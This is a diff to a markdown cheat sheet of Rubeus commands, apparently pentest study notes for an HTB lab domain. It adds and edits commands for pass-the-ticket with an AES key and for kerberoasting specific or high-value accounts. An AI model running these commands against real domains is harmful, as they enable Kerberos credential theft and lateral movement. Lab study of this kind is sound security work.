@@ -46,7 +46,7 @@ The option `createnetonly` creates a sacrificial process/logon session ([Logon 
 ```
 This should open a new CMD window from where we can execute Rubeus to request a new TGT, using `ptt`, to import the ticket into the current session and connect to the DC using PS Remoting.
 ```powershell
-> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<AES-KEY> /ptt
+PS > Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<AES-KEY> /ptt
 > powershell
 PS > Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<AES-KEY> /ptt
 ```
@@ -59,6 +59,10 @@ PS > .\Rubeus.exe kerberoast /stats
 - Request tickets of accounts with `admincount=1` (high value targets):
 ```powershell
 PS > .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+```
+- Request ticket for a specific user:
+```powershell
+PS > .\Rubeus.exe kerberoast /user:<USER> /nowrap
 ```
 ## Usefule Flags
 - `/tgtdeleg`: Retrieve only `RC4` encrypted ticket (Does not work on Server 2019+)
